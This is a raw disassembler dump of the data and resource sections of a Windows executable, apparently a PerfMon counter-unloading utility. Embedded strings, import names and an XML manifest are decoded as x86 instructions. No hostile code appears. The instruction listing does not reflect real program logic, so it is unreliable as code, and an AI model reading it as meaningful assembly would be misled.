  409b06:	fs ins BYTE PTR es:[edi],dx
  409b08:	add    BYTE PTR gs:[edx],cl
  409b0b:	add    BYTE PTR [ebx+0x72],al
  409b0e:	gs popa 
  409b10:	je     0x409b77
  409b12:	dec    ebp
  409b13:	jne    0x409b89
  409b15:	gs js  0x409b6f
  409b18:	add    BYTE PTR [eax],al
  409b1a:	add    BYTE PTR ss:[edi+0x61],dl
  409b1e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  409b26:	ins    BYTE PTR es:[di],dx
  409b28:	gs dec edi
  409b2a:	bound  ebp,QWORD PTR [edx+0x65]
  409b2d:	arpl   WORD PTR [eax+eax*1+0x13],si
  409b31:	add    BYTE PTR [edi+0x65],al
  409b34:	je     0x409b83
  409b36:	outs   dx,DWORD PTR ds:[esi]
  409b37:	fs jne 0x409ba6
  409b3a:	gs dec eax
  409b3c:	popa   
  409b3d:	outs   dx,BYTE PTR ds:[esi]
  409b3e:	fs ins BYTE PTR es:[edi],dx
  409b40:	gs push edi
  409b42:	add    BYTE PTR [eax],al
  409b44:	sbb    eax,DWORD PTR [eax]
  409b46:	dec    esp
  409b47:	outs   dx,DWORD PTR ds:[esi]
  409b48:	popa   
  409b49:	fs push ebx
  409b4b:	je     0x409bbf
  409b4d:	imul   ebp,DWORD PTR [esi+0x67],0x590057
  409b54:	push   edi
  409b55:	jb     0x409bc0
  409b57:	je     0x409bbe
  409b59:	inc    esi
  409b5a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x69570007
  409b62:	fs gs inc ebx
  409b65:	push   0x6f547261
  409b6a:	dec    ebp
  409b6b:	jne    0x409bd9
  409b6d:	je     0x409bd8
  409b6f:	inc    edx
  409b70:	jns    0x409be6
  409b72:	add    BYTE PTR gs:[esi+0x0],al
  409b76:	dec    ecx
  409b77:	outs   dx,BYTE PTR ds:[esi]
  409b78:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  409b80:	push   ebx
  409b81:	arpl   WORD PTR gs:[ebp+0x72],si
  409b85:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  409b8d:	imul   esi,DWORD PTR [eax+0x74],0x726f
  409b94:	or     BYTE PTR [eax],al
  409b96:	inc    esi
  409b97:	outs   dx,DWORD PTR ds:[esi]
  409b98:	jb     0x409c07
  409b9a:	popa   
  409b9b:	je     0x409bea
  409b9d:	gs jae 0x409c13
  409ba0:	popa   
  409ba1:	addr16 gs push edi
  409ba4:	add    BYTE PTR [eax],al
  409ba6:	pusha  
  409ba7:	add    BYTE PTR [ebx+0x65],dl
  409baa:	je     0x409bff
  409bac:	arpl   WORD PTR gs:[ebp+0x72],si
  409bb0:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  409bb8:	imul   esi,DWORD PTR [eax+0x74],0x6144726f
  409bbf:	arpl   WORD PTR [eax+eax*1+0xd],bp
  409bc3:	add    BYTE PTR [edi+0x72],dl
  409bc6:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x6f736e6f
  409bce:	ins    BYTE PTR es:[edi],dx
  409bcf:	gs push edi
  409bd1:	add    BYTE PTR [eax+eax*1],cl
  409bd4:	inc    edi
  409bd5:	gs je  0x409c2b
  409bd8:	je     0x409c3e
  409bda:	dec    eax
  409bdb:	popa   
  409bdc:	outs   dx,BYTE PTR ds:[esi]
  409bdd:	fs ins BYTE PTR es:[edi],dx
  409bdf:	add    BYTE PTR gs:[eax],al
  409be2:	push   ss
  409be3:	add    BYTE PTR [ecx+0x6c],al
  409be6:	ins    BYTE PTR es:[edi],dx
  409be7:	outs   dx,DWORD PTR ds:[esi]
  409be8:	arpl   WORD PTR [ecx+0x74],sp
  409beb:	gs inc ecx
  409bed:	outs   dx,BYTE PTR ds:[esi]
  409bee:	fs dec ecx
  409bf0:	outs   dx,BYTE PTR ds:[esi]
  409bf1:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  409bf9:	push   ebx
  409bfa:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x6f4c0002
  409c02:	arpl   WORD PTR [ecx+0x6c],sp
  409c05:	inc    ecx
  409c06:	ins    BYTE PTR es:[edi],dx
  409c07:	ins    BYTE PTR es:[edi],dx
  409c08:	outs   dx,DWORD PTR ds:[esi]
  409c09:	arpl   WORD PTR [eax],ax
  409c0b:	add    BYTE PTR [edi],ch
  409c0d:	add    BYTE PTR [edi+0x65],al
  409c10:	je     0x409c58
  409c12:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  409c1a:	sub    al,0x0
  409c1c:	inc    esi
  409c1d:	jb     0x409c84
  409c1f:	gs push ebx
  409c21:	imul   esp,DWORD PTR [eax+eax*1+0x3],0x636f4c00
  409c29:	popa   
  409c2a:	ins    BYTE PTR es:[edi],dx
  409c2b:	inc    esi
  409c2c:	jb     0x409c93
  409c2e:	add    BYTE PTR gs:[ecx+0x70],ah
  409c32:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409c3c:	outs   dx,DWORD PTR ds:[esi]
  409c3d:	jb     0x409ca4
  409c3f:	sub    eax,0x656c6966
  409c44:	sub    eax,0x322d316c
  409c49:	sub    eax,0x6c642e31
  409c4e:	ins    BYTE PTR es:[edi],dx
  409c4f:	add    BYTE PTR [ecx+0x70],ah
  409c52:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409c5c:	outs   dx,DWORD PTR ds:[esi]
  409c5d:	jb     0x409cc4
  409c5f:	sub    eax,0x69727473
  409c64:	outs   dx,BYTE PTR ds:[esi]
  409c65:	addr16 sub eax,0x312d316c
  409c6b:	sub    eax,0x6c642e30
  409c70:	ins    BYTE PTR es:[edi],dx
  409c71:	add    BYTE PTR [ecx+0x70],ah
  409c74:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409c7e:	outs   dx,DWORD PTR ds:[esi]
  409c7f:	jb     0x409ce6
  409c81:	sub    eax,0x646e6168
  409c86:	ins    BYTE PTR es:[edi],dx
  409c87:	gs sub eax,0x312d316c
  409c8d:	sub    eax,0x6c642e30
  409c92:	ins    BYTE PTR es:[edi],dx
  409c93:	add    BYTE PTR [ecx+0x70],ah
  409c96:	imul   ebp,DWORD PTR ds:0x772d736d,0x732d6e69
  409ca0:	arpl   WORD PTR gs:[ebp+0x72],si
  409ca4:	imul   esi,DWORD PTR [ecx+edi*2+0x2d],0x65736162
  409cac:	sub    eax,0x322d316c
  409cb1:	sub    eax,0x6c642e30
  409cb6:	ins    BYTE PTR es:[edi],dx
  409cb7:	add    BYTE PTR [ecx+0x70],ah
  409cba:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409cc4:	outs   dx,DWORD PTR ds:[esi]
  409cc5:	jb     0x409d2c
  409cc7:	sub    eax,0x736e6f63
  409ccc:	outs   dx,DWORD PTR ds:[esi]
  409ccd:	ins    BYTE PTR es:[edi],dx
  409cce:	gs sub eax,0x312d316c
  409cd4:	sub    eax,0x6c642e30
  409cd9:	ins    BYTE PTR es:[edi],dx
  409cda:	add    BYTE PTR [eax],al
  409cdc:	popa   
  409cdd:	jo     0x409d48
  409cdf:	sub    eax,0x772d736d
  409ce4:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409ceb:	sub    eax,0x70616568
  409cf0:	sub    eax,0x312d326c
  409cf5:	sub    eax,0x6c642e30
  409cfa:	ins    BYTE PTR es:[edi],dx
  409cfb:	add    BYTE PTR ds:0x67655200,cl
  409d01:	inc    ebp
  409d02:	outs   dx,BYTE PTR ds:[esi]
  409d03:	jne    0x409d72
  409d05:	dec    ebx
  409d06:	gs jns 0x409d60
  409d09:	add    BYTE PTR [eax],al
  409d0b:	add    BYTE PTR [ecx+0x73],cl
  409d0e:	push   esp
  409d0f:	gs js  0x409d86
  409d12:	push   ebp
  409d13:	outs   dx,BYTE PTR ds:[esi]
  409d14:	imul   esp,DWORD PTR [ebx+0x6f],0xa006564
  409d1b:	add    BYTE PTR [edx+0x65],dl
  409d1e:	addr16 inc esp
  409d20:	gs ins BYTE PTR es:[edi],dx
  409d22:	gs je  0x409d8a
  409d25:	dec    ebx
  409d26:	gs jns 0x409d80
  409d29:	add    BYTE PTR [ebx],al
  409d2b:	add    BYTE PTR [ebx+0x65],dl
  409d2e:	je     0x409d75
  409d30:	outs   dx,BYTE PTR ds:[esi]
  409d31:	je     0x409da5
  409d33:	imul   esp,DWORD PTR [ebp+0x73],0x63416e49
  409d3a:	ins    BYTE PTR es:[edi],dx
  409d3b:	push   edi
  409d3c:	add    BYTE PTR [eax],al
  409d3e:	popa   
  409d3f:	jo     0x409daa
  409d41:	sub    eax,0x772d736d
  409d46:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409d4d:	sub    eax,0x69676572
  409d52:	jae    0x409dc8
  409d54:	jb     0x409dcf
  409d56:	sub    eax,0x322d326c
  409d5b:	sub    eax,0x6c642e30
  409d60:	ins    BYTE PTR es:[edi],dx
  409d61:	add    BYTE PTR [ecx+0x70],ah
  409d64:	imul   ebp,DWORD PTR ds:0x772d736d,0x622d6e69
  409d6e:	popa   
  409d6f:	jae    0x409dd6
  409d71:	sub    eax,0x6c697475
  409d76:	sub    eax,0x312d316c
  409d7b:	sub    eax,0x6c642e30
  409d80:	ins    BYTE PTR es:[edi],dx
  409d81:	add    BYTE PTR [ecx+0x70],ah
  409d84:	imul   ebp,DWORD PTR ds:0x772d736d,0x732d6e69
  409d8e:	arpl   WORD PTR gs:[ebp+0x72],si
  409d92:	imul   esi,DWORD PTR [ecx+edi*2+0x2d],0x766f7270
  409d9a:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x2d316c2d
  409da2:	xor    DWORD PTR ds:0x6c642e30,ebp
  409da8:	ins    BYTE PTR es:[edi],dx
  409da9:	add    BYTE PTR [edx+0x6f6c6604],bh
  409daf:	outs   dx,DWORD PTR ds:[esi]
  409db0:	jb     0x409db2
  409db2:	or     DWORD PTR ds:0x636d656d,eax
  409db8:	jo     0x409e33
  409dba:	add    BYTE PTR [eax],al
  409dbc:	or     eax,0x6d656d05
  409dc1:	jae    0x409e28
  409dc3:	je     0x409dc5
	...

Disassembly of section .rsrc:

0040a000 <.rsrc>:
	...
  40a00c:	add    DWORD PTR [eax],eax
  40a00e:	add    al,BYTE PTR [eax]
  40a010:	call   0x28c0a015
  40a015:	add    BYTE PTR [eax],al
  40a017:	adc    BYTE PTR [eax],0x0
  40a01a:	add    BYTE PTR [eax],al
  40a01c:	inc    eax
  40a01d:	add    BYTE PTR [eax],al
  40a01f:	sbb    BYTE PTR [eax],0x0
  40a022:	add    BYTE PTR [eax],al
  40a024:	pop    eax
  40a025:	add    BYTE PTR [eax],al
  40a027:	add    BYTE PTR [eax],0x0
	...
  40a036:	add    DWORD PTR [eax],eax
  40a038:	add    DWORD PTR [eax],eax
  40a03a:	add    BYTE PTR [eax],al
  40a03c:	jo     0x40a03e
  40a03e:	add    BYTE PTR [eax+0x0],al
	...
  40a04c:	add    BYTE PTR [eax],al
  40a04e:	add    DWORD PTR [eax],eax
  40a050:	add    DWORD PTR [eax],eax
  40a052:	add    BYTE PTR [eax],al
  40a054:	mov    BYTE PTR [eax],al
  40a056:	add    BYTE PTR [eax+0x0],al
	...
  40a064:	add    BYTE PTR [eax],al
  40a066:	add    DWORD PTR [eax],eax
  40a068:	add    DWORD PTR [eax],eax
  40a06a:	add    BYTE PTR [eax],al
  40a06c:	mov    al,ds:0x800000
	...
  40a07d:	add    BYTE PTR [ecx],al
  40a07f:	add    BYTE PTR [ecx],cl
  40a081:	add    al,0x0
  40a083:	add    BYTE PTR [eax+0x0],bh
	...
  40a095:	add    BYTE PTR [ecx],al
  40a097:	add    BYTE PTR [ecx],cl
  40a099:	add    al,0x0
  40a09b:	add    al,cl
	...
  40a0ad:	add    BYTE PTR [ecx],al
  40a0af:	add    BYTE PTR [ecx],cl
  40a0b1:	add    al,0x0
  40a0b3:	add    al,bl
  40a0b5:	add    BYTE PTR [eax],al
  40a0b7:	add    BYTE PTR [eax],bh
  40a0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ba:	add    BYTE PTR [eax],al
  40a0bc:	enter  0x0,0x0
	...
  40a0c8:	cwde   
  40a0c9:	mov    ds:0x39c0000,eax
	...
  40a0d6:	add    BYTE PTR [eax],al
  40a0d8:	lock mov al,ds:0x2a80000
	...
  40a0e6:	add    BYTE PTR [eax],al
  40a0e8:	add    eax,DWORD PTR [eax]
  40a0ea:	dec    ebp
  40a0eb:	add    BYTE PTR [ebp+0x0],dl
  40a0ee:	dec    ecx
  40a0ef:	add    BYTE PTR [edi+edi*1],bh
  40a0f2:	js     0x40a161
  40a0f4:	ins    BYTE PTR es:[edi],dx
  40a0f5:	and    BYTE PTR [esi+0x65],dh
  40a0f8:	jb     0x40a16d
  40a0fa:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a101:	xor    BYTE PTR [edx],ah
  40a103:	and    BYTE PTR [ebp+0x6e],ah
  40a106:	arpl   WORD PTR [edi+0x64],bp
  40a109:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40a110:	inc    esi
  40a111:	sub    eax,0x73202238
  40a116:	je     0x40a179
  40a118:	outs   dx,BYTE PTR ds:[esi]
  40a119:	fs popa 
  40a11b:	ins    BYTE PTR es:[edi],dx
  40a11c:	outs   dx,DWORD PTR ds:[esi]
  40a11d:	outs   dx,BYTE PTR ds:[esi]
  40a11e:	gs cmp eax,0x73657922
  40a124:	and    bh,BYTE PTR [edi]
  40a126:	ds or  eax,0x2d213c0a
  40a12c:	sub    eax,0x706f4320
  40a131:	jns    0x40a1a5
  40a133:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40a13a:	sub    DWORD PTR [eax],esp
  40a13c:	dec    ebp
  40a13d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a144:	je     0x40a166
  40a146:	inc    ebx
  40a147:	outs   dx,DWORD PTR ds:[esi]
  40a148:	jb     0x40a1ba
  40a14a:	outs   dx,DWORD PTR ds:[esi]
  40a14b:	jb     0x40a1ae
  40a14d:	je     0x40a1b8
  40a14f:	outs   dx,DWORD PTR ds:[esi]
  40a150:	outs   dx,BYTE PTR ds:[esi]
  40a151:	and    BYTE PTR ds:0xa0d3e2d,ch
  40a157:	cmp    al,0x61
  40a159:	jae    0x40a1ce
  40a15b:	gs ins DWORD PTR es:[edi],dx
  40a15d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40a161:	js     0x40a1d0
  40a163:	ins    BYTE PTR es:[edi],dx
  40a164:	outs   dx,BYTE PTR ds:[esi]
  40a165:	jae    0x40a1a4
  40a167:	and    dh,BYTE PTR [ebp+0x72]
  40a16a:	outs   dx,BYTE PTR ds:[esi]
  40a16b:	cmp    dh,BYTE PTR [ebx+0x63]
  40a16e:	push   0x73616d65
  40a173:	sub    eax,0x7263696d
  40a178:	outs   dx,DWORD PTR ds:[esi]
  40a179:	jae    0x40a1ea
  40a17b:	data16 je 0x40a1ab
  40a17e:	arpl   WORD PTR [edi+0x6d],bp
  40a181:	cmp    ah,BYTE PTR [ecx+0x73]
  40a184:	ins    DWORD PTR es:[edi],dx
  40a185:	cs jbe 0x40a1b9
  40a188:	and    ah,BYTE PTR [eax]
  40a18a:	ins    DWORD PTR es:[edi],dx
  40a18b:	popa   
  40a18c:	outs   dx,BYTE PTR ds:[esi]
  40a18d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40a194:	jb     0x40a209
  40a196:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a19d:	xor    BYTE PTR [edx],ah
  40a19f:	ds or  eax,0x73613c0a
  40a1a5:	jae    0x40a20c
  40a1a7:	ins    DWORD PTR es:[edi],dx
  40a1a8:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a1ac:	fs outs dx,BYTE PTR gs:[esi]
  40a1af:	je     0x40a21a
  40a1b1:	je     0x40a22c
  40a1b3:	or     eax,0x2020200a
  40a1b8:	and    BYTE PTR [esi+0x65],dh
  40a1bb:	jb     0x40a230
  40a1bd:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40a1c4:	xor    DWORD PTR [esi],ebp
  40a1c6:	xor    BYTE PTR [esi],ch
  40a1c8:	xor    BYTE PTR [edx],ah
  40a1ca:	or     eax,0x2020200a
  40a1cf:	and    BYTE PTR [eax+0x72],dh
  40a1d2:	outs   dx,DWORD PTR ds:[esi]
  40a1d3:	arpl   WORD PTR [ebp+0x73],sp
  40a1d6:	jae    0x40a247
  40a1d8:	jb     0x40a21b
  40a1da:	jb     0x40a23f
  40a1dc:	push   0x63657469
  40a1e1:	je     0x40a258
  40a1e3:	jb     0x40a24a
  40a1e5:	cmp    eax,0x36387822
  40a1ea:	and    cl,BYTE PTR ds:0x2020200a
  40a1f0:	and    BYTE PTR [esi+0x61],ch
  40a1f3:	ins    DWORD PTR es:[edi],dx
  40a1f4:	gs cmp eax,0x63694d22
  40a1fa:	jb     0x40a26b
  40a1fc:	jae    0x40a26d
  40a1fe:	data16 je 0x40a22f
  40a201:	push   edi
  40a202:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40a209:	inc    esp
  40a20a:	imul   esp,DWORD PTR [ecx+0x67],0x69736f6e
  40a211:	jae    0x40a241
  40a213:	push   ebp
  40a214:	outs   dx,BYTE PTR ds:[esi]
  40a215:	ins    BYTE PTR es:[edi],dx
  40a216:	outs   dx,DWORD PTR ds:[esi]
  40a217:	fs inc ebx
  40a219:	je     0x40a28d
  40a21b:	and    cl,BYTE PTR ds:0x2020200a
  40a221:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40a225:	gs cmp eax,0x6e697722
  40a22b:	xor    esi,DWORD PTR [edx]
  40a22d:	and    cl,BYTE PTR ds:0xd3e2f0a
  40a233:	or     bh,BYTE PTR [esp+eiz*2]
  40a236:	gs jae 0x40a29c
  40a239:	jb     0x40a2a4
  40a23b:	jo     0x40a2b1
  40a23d:	imul   ebp,DWORD PTR [edi+0x6e],0x6c6e553e
  40a244:	outs   dx,DWORD PTR ds:[esi]
  40a245:	popa   
  40a246:	and    BYTE PTR fs:[eax+0x65],dl
  40a24a:	jb     0x40a2b2
  40a24c:	dec    ebp
  40a24d:	outs   dx,DWORD PTR ds:[esi]
  40a24e:	outs   dx,BYTE PTR ds:[esi]
  40a24f:	and    BYTE PTR [ebx+0x6f],al
  40a252:	jne    0x40a2c2
  40a254:	je     0x40a2bb
  40a256:	jb     0x40a2cb
  40a258:	cmp    al,0x2f
  40a25a:	fs gs jae 0x40a2c1
  40a25e:	jb     0x40a2c9
  40a260:	jo     0x40a2d6
  40a262:	imul   ebp,DWORD PTR [edi+0x6e],0xd0a0d3e
  40a269:	or     bh,BYTE PTR [esp+esi*2]
  40a26c:	jb     0x40a2e3
  40a26e:	jae    0x40a2e4
  40a270:	dec    ecx
  40a271:	outs   dx,BYTE PTR ds:[esi]
  40a272:	outs   dx,WORD PTR ds:[esi]
  40a274:	and    BYTE PTR [eax+0x6d],bh
  40a277:	ins    BYTE PTR es:[edi],dx
  40a278:	outs   dx,BYTE PTR ds:[esi]
  40a279:	jae    0x40a2b8
  40a27b:	and    dh,BYTE PTR [ebp+0x72]
  40a27e:	outs   dx,BYTE PTR ds:[esi]
  40a27f:	cmp    dh,BYTE PTR [ebx+0x63]
  40a282:	push   0x73616d65
  40a287:	sub    eax,0x7263696d
  40a28c:	outs   dx,DWORD PTR ds:[esi]
  40a28d:	jae    0x40a2fe
  40a28f:	data16 je 0x40a2bf
  40a292:	arpl   WORD PTR [edi+0x6d],bp
  40a295:	cmp    ah,BYTE PTR [ecx+0x73]
  40a298:	ins    DWORD PTR es:[edi],dx
  40a299:	cs jbe 0x40a2cf
  40a29c:	and    bh,BYTE PTR [esi]
  40a29e:	or     eax,0x2020200a
  40a2a3:	and    BYTE PTR [ebx+esi*2],bh
  40a2a6:	arpl   WORD PTR gs:[ebp+0x72],si
  40a2aa:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40a2b2:	and    BYTE PTR [eax],ah
  40a2b4:	and    BYTE PTR [eax],ah
  40a2b6:	and    BYTE PTR [eax],ah
  40a2b8:	cmp    al,0x72
  40a2ba:	gs jno 0x40a332
  40a2bd:	gs jae 0x40a334
  40a2c0:	gs fs push eax
  40a2c3:	jb     0x40a32e
  40a2c5:	jbe    0x40a330
  40a2c7:	ins    BYTE PTR es:[edi],dx
  40a2c8:	gs addr16 gs jae 0x40a30b
  40a2cd:	or     eax,0x2020200a
  40a2d2:	and    BYTE PTR [eax],ah
  40a2d4:	and    BYTE PTR [eax],ah
  40a2d6:	and    BYTE PTR [eax],ah
  40a2d8:	and    BYTE PTR [eax],ah
  40a2da:	and    BYTE PTR [edx+esi*2],bh
  40a2dd:	gs jno 0x40a355
  40a2e0:	gs jae 0x40a357
  40a2e3:	gs fs inc ebp
  40a2e6:	js     0x40a34d
  40a2e8:	arpl   WORD PTR [ebp+0x74],si
  40a2eb:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40a2f2:	ins    BYTE PTR es:[edi],dx
  40a2f3:	or     eax,0x2020200a
  40a2f8:	and    BYTE PTR [eax],ah
  40a2fa:	and    BYTE PTR [eax],ah
  40a2fc:	and    BYTE PTR [eax],ah
  40a2fe:	and    BYTE PTR [eax],ah
  40a300:	and    BYTE PTR [eax],ah
  40a302:	and    BYTE PTR [eax],ah
  40a304:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40a308:	gs ins BYTE PTR es:[edi],dx
  40a30a:	cmp    eax,0x49736122
  40a30f:	outs   dx,BYTE PTR ds:[esi]
  40a310:	jbe    0x40a381
  40a312:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40a316:	or     eax,0x2020200a
  40a31b:	and    BYTE PTR [eax],ah
  40a31d:	and    BYTE PTR [eax],ah
  40a31f:	and    BYTE PTR [eax],ah
  40a321:	and    BYTE PTR [eax],ah
  40a323:	and    BYTE PTR [eax],ah
  40a325:	and    BYTE PTR [eax],ah
  40a327:	and    BYTE PTR [ebp+0x69],dh
  40a32a:	inc    ecx
  40a32b:	arpl   WORD PTR [ebx+0x65],sp
  40a32e:	jae    0x40a3a3
  40a330:	cmp    eax,0x6c616622
  40a335:	jae    0x40a39c
  40a337:	and    cl,BYTE PTR ds:0x2020200a
  40a33d:	and    BYTE PTR [eax],ah
  40a33f:	and    BYTE PTR [eax],ah
  40a341:	and    BYTE PTR [eax],ah
  40a343:	and    BYTE PTR [eax],ah
  40a345:	and    BYTE PTR [edi],ch
  40a347:	ds or  eax,0x2020200a
  40a34d:	and    BYTE PTR [eax],ah
  40a34f:	and    BYTE PTR [eax],ah
  40a351:	and    BYTE PTR [edi+ebp*1],bh
  40a354:	jb     0x40a3bb
  40a356:	jno    0x40a3cd
  40a358:	gs jae 0x40a3cf
  40a35b:	gs fs push eax
  40a35e:	jb     0x40a3c9
  40a360:	jbe    0x40a3cb
  40a362:	ins    BYTE PTR es:[edi],dx
  40a363:	gs addr16 gs jae 0x40a3a6
  40a368:	or     eax,0x2020200a
  40a36d:	and    BYTE PTR [edi+ebp*1],bh
  40a370:	jae    0x40a3d7
  40a372:	arpl   WORD PTR [ebp+0x72],si
  40a375:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  40a37d:	je     0x40a3f1
  40a37f:	jne    0x40a3f4
  40a381:	je     0x40a3cc
  40a383:	outs   dx,BYTE PTR ds:[esi]
  40a384:	outs   dx,WORD PTR ds:[esi]
  40a386:	ds or  eax,0x612f3c0a
  40a38c:	jae    0x40a401
  40a38e:	gs ins DWORD PTR es:[edi],dx
  40a390:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a394:	or     eax,0x9c0a0d0a
  40a399:	add    esi,DWORD PTR [eax+eax*1]
  40a39c:	add    BYTE PTR [eax],al
  40a39e:	push   esi
  40a39f:	add    BYTE PTR [ebx+0x0],dl
  40a3a2:	pop    edi
  40a3a3:	add    BYTE PTR [esi+0x0],dl
  40a3a6:	inc    ebp
  40a3a7:	add    BYTE PTR [edx+0x0],dl
  40a3aa:	push   ebx
  40a3ab:	add    BYTE PTR [ecx+0x0],cl
  40a3ae:	dec    edi
  40a3af:	add    BYTE PTR [esi+0x0],cl
  40a3b2:	pop    edi
  40a3b3:	add    BYTE PTR [ecx+0x0],cl
  40a3b6:	dec    esi
  40a3b7:	add    BYTE PTR [esi+0x0],al
  40a3ba:	dec    edi
  40a3bb:	add    BYTE PTR [eax],al
  40a3bd:	add    BYTE PTR [eax],al
  40a3bf:	add    BYTE PTR [ebp+0xfeef04],bh
  40a3c5:	add    BYTE PTR [ecx],al
  40a3c7:	add    BYTE PTR [eax],al
  40a3c9:	add    BYTE PTR [edx],cl
  40a3cb:	add    BYTE PTR [eax],al
  40a3cd:	inc    eax
  40a3ce:	add    BYTE PTR [eax],ch
  40a3d0:	add    BYTE PTR [eax],al
  40a3d2:	or     al,BYTE PTR [eax]
  40a3d4:	add    BYTE PTR [eax+0x0],al
  40a3d7:	sub    BYTE PTR [edi],bh
  40a3d9:	add    BYTE PTR [eax],al
  40a3db:	add    BYTE PTR [eax],al
  40a3dd:	add    BYTE PTR [eax],al
  40a3df:	add    BYTE PTR [eax+eax*1],al
  40a3e2:	add    al,0x0
  40a3e4:	add    DWORD PTR [eax],eax
	...
  40a3f2:	add    BYTE PTR [eax],al
  40a3f4:	cli    
  40a3f5:	add    al,BYTE PTR [eax]
  40a3f7:	add    BYTE PTR [ecx],al
  40a3f9:	add    BYTE PTR [ebx+0x0],dl
  40a3fc:	je     0x40a3fe
  40a3fe:	jb     0x40a400
  40a400:	imul   eax,DWORD PTR [eax],0x67006e
  40a406:	inc    esi
  40a407:	add    BYTE PTR [ecx+0x0],ch
  40a40a:	ins    BYTE PTR es:[edi],dx
  40a40b:	add    BYTE PTR [ebp+0x0],ah
  40a40e:	dec    ecx
  40a40f:	add    BYTE PTR [esi+0x0],ch
  40a412:	data16 add BYTE PTR [edi+0x0],ch
  40a416:	add    BYTE PTR [eax],al
  40a418:	(bad)  
  40a419:	add    al,BYTE PTR [eax]
  40a41b:	add    BYTE PTR [ecx],al
  40a41d:	add    BYTE PTR [eax],dh
  40a41f:	add    BYTE PTR [eax+eax*1],dh
  40a422:	xor    BYTE PTR [eax],al
  40a424:	cmp    DWORD PTR [eax],eax
  40a426:	xor    BYTE PTR [eax],al
  40a428:	xor    al,0x0
  40a42a:	inc    edx
  40a42b:	add    BYTE PTR [eax],dh
  40a42d:	add    BYTE PTR [eax],al
  40a42f:	add    BYTE PTR [eax+eax*1+0x16],cl
  40a433:	add    BYTE PTR [ecx],al
  40a435:	add    BYTE PTR [ebx+0x0],al
  40a438:	outs   dx,DWORD PTR ds:[esi]
  40a439:	add    BYTE PTR [ebp+0x0],ch
  40a43c:	jo     0x40a43e
  40a43e:	popa   
  40a43f:	add    BYTE PTR [esi+0x0],ch
  40a442:	jns    0x40a444
  40a444:	dec    esi
  40a445:	add    BYTE PTR [ecx+0x0],ah
  40a448:	ins    DWORD PTR es:[edi],dx
  40a449:	add    BYTE PTR [ebp+0x0],ah
  40a44c:	add    BYTE PTR [eax],al
  40a44e:	add    BYTE PTR [eax],al
  40a450:	dec    ebp
  40a451:	add    BYTE PTR [ecx+0x0],ch
  40a454:	arpl   WORD PTR [eax],ax
  40a456:	jb     0x40a458
  40a458:	outs   dx,DWORD PTR ds:[esi]
  40a459:	add    BYTE PTR [ebx+0x0],dh
  40a45c:	outs   dx,DWORD PTR ds:[esi]
  40a45d:	add    BYTE PTR [esi+0x0],ah
  40a460:	je     0x40a462
  40a462:	and    BYTE PTR [eax],al
  40a464:	inc    ebx
  40a465:	add    BYTE PTR [edi+0x0],ch
  40a468:	jb     0x40a46a
  40a46a:	jo     0x40a46c
  40a46c:	outs   dx,DWORD PTR ds:[esi]
  40a46d:	add    BYTE PTR [edx+0x0],dh
  40a470:	popa   
  40a471:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a475:	add    BYTE PTR [edi+0x0],ch
  40a478:	outs   dx,BYTE PTR ds:[esi]
  40a479:	add    BYTE PTR [eax],al
  40a47b:	add    BYTE PTR [eax+0x0],bl
  40a47e:	sbb    BYTE PTR [eax],al
  40a480:	add    DWORD PTR [eax],eax
  40a482:	inc    esi
  40a483:	add    BYTE PTR [ecx+0x0],ch
  40a486:	ins    BYTE PTR es:[edi],dx
  40a487:	add    BYTE PTR [ebp+0x0],ah
  40a48a:	inc    esp
  40a48b:	add    BYTE PTR [ebp+0x0],ah
  40a48e:	jae    0x40a490
  40a490:	arpl   WORD PTR [eax],ax
  40a492:	jb     0x40a494
  40a494:	imul   eax,DWORD PTR [eax],0x740070
  40a49a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [eax],al
  40a4a4:	push   ebp
  40a4a5:	add    BYTE PTR [esi+0x0],ch
  40a4a8:	ins    BYTE PTR es:[edi],dx
  40a4a9:	add    BYTE PTR [edi+0x0],ch
  40a4ac:	popa   
  40a4ad:	add    BYTE PTR [eax+eax*1+0x20],ah
  40a4b1:	add    BYTE PTR [eax+0x0],dl
  40a4b4:	add    BYTE PTR gs:[edx+0x0],dh
  40a4b8:	data16 add BYTE PTR [ebp+0x0],cl
  40a4bc:	outs   dx,DWORD PTR ds:[esi]
  40a4bd:	add    BYTE PTR [esi+0x0],ch
  40a4c0:	and    BYTE PTR [eax],al
  40a4c2:	inc    ebx
  40a4c3:	add    BYTE PTR [edi+0x0],ch
  40a4c6:	jne    0x40a4c8
